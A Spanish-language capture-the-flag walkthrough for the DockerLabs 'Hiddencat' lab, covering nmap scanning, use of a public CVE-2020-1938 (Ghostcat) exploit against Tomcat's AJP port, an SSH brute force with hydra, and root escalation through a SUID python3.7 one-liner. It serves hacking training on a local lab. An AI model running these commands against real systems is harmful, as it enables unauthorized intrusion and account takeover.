---
icon: flag
---

# Hiddencat DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip hiddencat.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh hiddencat.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

Pero si intentamos hacer un `nmap` no nos va a dejar por que hay un error en el `TAR` al desplegar la maquina, por lo que ejecutaremos la maquina para que no aparezca ningun error, mientras la maquina esta desplegada, ejecutamos en otra terminal lo siguiente:

```shell
sudo docker run --ulimit nofile=65536:65536 hiddencat
```

Info:

```
Starting OpenBSD Secure Shell server: sshd.
21-Jan-2025 19:52:57.889 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/9.0.30
21-Jan-2025 19:52:57.891 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Dec 7 2019 16:42:04 UTC
21-Jan-2025 19:52:57.891 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 9.0.30.0
21-Jan-2025 19:52:57.891 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
21-Jan-2025 19:52:57.891 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            6.8.11-amd64
21-Jan-2025 19:52:57.891 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
21-Jan-2025 19:52:57.891 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/local/openjdk-8/jre
21-Jan-2025 19:52:57.891 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_242-b08
21-Jan-2025 19:52:57.891 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Oracle Corporation
21-Jan-2025 19:52:57.891 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /usr/local/tomcat
21-Jan-2025 19:52:57.892 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /usr/local/tomcat
21-Jan-2025 19:52:57.893 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties
21-Jan-2025 19:52:57.893 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
21-Jan-2025 19:52:57.893 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
21-Jan-2025 19:52:57.893 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
21-Jan-2025 19:52:57.893 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
21-Jan-2025 19:52:57.893 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
21-Jan-2025 19:52:57.894 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/usr/local/tomcat
21-Jan-2025 19:52:57.894 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/usr/local/tomcat
21-Jan-2025 19:52:57.894 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/usr/local/tomcat/temp
21-Jan-2025 19:52:57.894 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent Loaded APR based Apache Tomcat Native library [1.2.23] using APR version [1.6.5].
21-Jan-2025 19:52:57.894 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent APR capabilities: IPv6 [true], sendfile [true], accept filters [false], random [true].
21-Jan-2025 19:52:57.894 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent APR/OpenSSL configuration: useAprConnector [false], useOpenSSL [true]
21-Jan-2025 19:52:57.896 INFO [main] org.apache.catalina.core.AprLifecycleListener.initializeSSL OpenSSL successfully initialized [OpenSSL 1.1.1d  10 Sep 2019]
21-Jan-2025 19:52:58.073 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8080"]
21-Jan-2025 19:52:58.105 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["ajp-nio-8009"]
21-Jan-2025 19:52:58.106 INFO [main] org.apache.catalina.startup.Catalina.load Server initialization in [341] milliseconds
21-Jan-2025 19:52:58.125 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
21-Jan-2025 19:52:58.125 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/9.0.30]
21-Jan-2025 19:52:58.133 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/manager]
21-Jan-2025 19:52:58.296 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/manager] has finished in [164] ms
21-Jan-2025 19:52:58.297 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/ROOT]
21-Jan-2025 19:52:58.308 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/ROOT] has finished in [12] ms
21-Jan-2025 19:52:58.309 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/examples]
21-Jan-2025 19:52:58.488 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/examples] has finished in [179] ms
21-Jan-2025 19:52:58.488 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/docs]
21-Jan-2025 19:52:58.499 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/docs] has finished in [11] ms
21-Jan-2025 19:52:58.499 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/host-manager]
21-Jan-2025 19:52:58.514 INFO [main] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/host-manager] has finished in [15] ms
21-Jan-2025 19:52:58.517 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8080"]
21-Jan-2025 19:52:58.524 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["ajp-nio-8009"]
21-Jan-2025 19:52:58.527 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in [420] milliseconds
```

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-21 14:55 EST
Nmap scan report for 172.17.0.2
Host is up (0.000024s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4d:8d:56:7f:47:95:da:d9:a4:bb:bc:3e:f1:56:93:d5 (RSA)
|   256 8d:82:e6:7d:fb:1c:08:89:06:11:5b:fd:a8:08:1e:72 (ECDSA)
|_  256 1e:eb:63:bd:b9:87:72:43:49:6c:76:e1:45:69:ca:75 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http    Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.30
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.11 seconds
```

Vemos que hay un `tomcat` desplegado y el puerto por defecto del mismo es el `8080` el otro es para su funcionamiento, por lo que omitimos ese puerto, si entramos en dicho puerto:

```
URL = http://<IP>:8080/
```

De primeras vemos que tiene la siguiente version:

```
Apache Tomcat/9.0.30
```

Si realizamos un escaneo de la pagina, confirmamos que tiene dicha version:

```shell
whatweb http://<IP>:8080
```

Info:

```
http://172.17.0.2:8080 [200 OK] Country[RESERVED][ZZ], HTML5, IP[172.17.0.2], Title[Apache Tomcat/9.0.30]
```

Vamos a buscar si esa version de `tomcat` tuviera algun exploit asociado al mismo.

Vemos que si tiene asociada una vulnerabilidad, en concreto su `CVE` es el siguiente:

```
CVE-2020-1938
```

Y el exploit que vamos a utilizar esta en el siguiente repositorio:

URL = [Exploit Tomcat](https://github.com/dacade/CVE-2020-1938)

Lo descargamos y lo utilizaremos de la siguiente forma:

```shell
python3 exploit.py <IP> -p 8009 -f WEB-INF/web.xml
```

Info:

```
Getting resource at ajp13://172.17.0.2:8009/hissec
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat, Jerry ;)
  </description>

</web-app>
```

Vemos que encontramos el usuario `Jerry` por lo que le haremos fuerza bruta.

## Escalate user jerry

### Hydra

```shell
hydra -l jerry -P <WORDLIST> ssh://<IP> -t 64
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-27 12:53:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: jerry   password: chocolate
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 24 final worker threads did not complete until end.
[ERROR] 24 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-27 12:53:25
```

Vemos que encontramos las credenciales de dicho usuario.

### SSH

```shell
ssh jerry@<IP>
```

Metemos como contraseña `chocolate` y veremos que estamos dentro.

## Escalate Privileges

Si listamos los permisos `SUID` que tenemos, veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
931973     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 /usr/bin/newgrp
   949765   3128 -rwsr-xr-x   2 root     root      3201864 Jul 21  2020 /usr/bin/perl
   931882     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh
   931879     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn
   931984     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 /usr/bin/passwd
   949765   3128 -rwsr-xr-x   2 root     root      3201864 Jul 21  2020 /usr/bin/perl5.28.1
   931929     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd
   956522   4760 -rwsr-xr-x   2 root     root      4874240 Mar 23  2024 /usr/bin/python3.7m
   956522   4760 -rwsr-xr-x   2 root     root      4874240 Mar 23  2024 /usr/bin/python3.7
   949829    428 -rwsr-xr-x   1 root     root       436552 Dec 24  2023 /usr/lib/openssh/ssh-keysign
   949817     52 -rwsr-xr--   1 root     messagebus    51184 Oct 23  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   931356     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /bin/umount
   931350     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /bin/su
   931331     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /bin/mount
   931336     64 -rwsr-xr-x   1 root     root          65272 Aug  3  2018 /bin/ping
```

Vemos varias cosas interesantes, pero entre ellas la mas importante:

```
956522  4760 -rwsr-xr-x   2 root  root  4874240 Mar 23  2024 /usr/bin/python3.7
```

Por lo que haremos lo siguiente:

```shell
python3.7 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

Info:

```
bash-5.0# whoami
root
```

Con esto veremos que ya seremos el usuario `root`, por lo que habremos terminado la maquina.
